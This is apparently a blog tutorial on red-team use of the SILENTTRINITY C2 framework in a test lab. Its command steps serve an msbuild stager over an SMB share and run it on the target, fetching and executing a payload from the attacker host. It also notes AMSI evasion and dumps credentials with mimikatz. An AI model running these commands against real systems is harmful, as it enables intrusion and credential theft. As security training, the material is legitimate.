# SILENTTRINITY

SILENTTRINITY is a tool made by [byt3bl33d3r](https://twitter.com/byt3bl33d3r) which uses Ironpython for awesome C2 and post exploitation. I'll refer to it as ST in this article.

## Installation

Install the tool and its dependencies, then start it. I've included the manual installation of the latest and greatest [impacket ](https://github.com/SecureAuthCorp/impacket)here too.

{% code-tabs %}
{% code-tabs-item title="hacker@kali" %}
```text
#Install deps
cd /opt
git clone https://github.com/SecureAuthCorp/impacket.git 
cd impacket
pip install -r requirements.txt
python setup.py install

#Install ST
apt install python3.7 python3.7-dev python3-pip
git clone https://github.com/byt3bl33d3r/SILENTTRINITY
cd SILENTTRINITY/Server
python3.7 -m pip install -r requirements.txt

#Start it up
python3.7 st.py
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Listening

Proceed with selecting a listener, binding it to an IP + port and starting it. And btw I set my BindIP to a different subnet because I am connected to my test lab using VPN. Nothing magic going on.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
listeners
list
use http
options
set BindIP 10.0.8.6
start
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Staging

Proceed to generate a stager. It will end up in the `/opt/SILENTTRINITY/Server` directory.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
stagers
list
use msbuild
generate http
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Execution

Now, find an appropriate way of downloading and triggering the stager. As per November 2018, the msbuild stager payloads still haven't triggered AMSI on Windows 10 1803.

### Serving the payload

A neat trick is using an SMB server for serving the payload. Download and trigger it it with `msbuild` and the UNC path to your SMB server as argument.

First create a share folder and then start the SMB server from impacket.

{% code-tabs %}
{% code-tabs-item title="hacker@kali" %}
```text
mkdir /opt/SMB
smbserver.py SMB /opt/SMB -username hacker -password hacker -smb2support -ip 10.0.8.6
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Triggering the payload

Now we try to trigger the payload with msbuild, but it fails because we aren't authenticated.

{% code-tabs %}
{% code-tabs-item title="victim@target" %}
```text
cp /opt/SILENTTRINITY/Server/msbuild.xml /opt/SMB/msbuild.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\10.0.8.6\SMB\msbuild.xml
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-34.png)

### Caching credentials

So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host. As you see I use hacker/hacker for authentication. Very secure of course. On the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and therefore cache them locally on the target. From an opsec perspective this isnâ€™t ideal, so if you have suggestions please reach out.

{% code-tabs %}
{% code-tabs-item title="victim@target" %}
```text
net use \\10.0.8.6\smb /user:hacker hacker
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-32.png)

We see that we get a successful authentication and a NetNTLMv2 hash instantly. So now with cached credentials on the target, let's try to trigger our payload again.

![](../.gitbook/assets/image-12.png)

Voila! Something started happening. Let's check back in ST.

![](../.gitbook/assets/image-36.png)

Like sweet magic, we got a session. The authentication reuses the credentials that were cached.

## Modules

Now we list the session we just acquired. Because I triggered the payload from an elevated shell, we have a session with elevated privileges. That allows us to do things like dump credentials and other kinds of post exploitation fun.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
sessions
list
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-41.png)

So let's explore some of the post exploitation modules that ST has to offer. As you can see, ST has a lot of built in modules already and by the looks of it, there are more to come.

![](../.gitbook/assets/image-2.png)

Let's select the `mimikatz` module and run it towards our session. Word of notice here, you have to copy the GUID from the session list so you have it ready. You can alternatively use `run all` to run it on all session, if you have several sessions.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
list
use mimikatz
options
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-27.png)

Running the shell module for good measure

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
use shell
options
set Command whoami
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-47.png)

Trying the execute-assembly module with [Watson](https://github.com/rasta-mouse/Watson). Actually noticed at this point that ST starts autocompleting the GUID for the session I'm working on. Right arrow on the keyboard to complete it.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
use execute-assembly
options
set Assembly /opt/Watson.exe
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Didn't find anything on my patched Windows 10 1803 VM, but that's ok.

Thanks [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) for an awesome C2 platform.
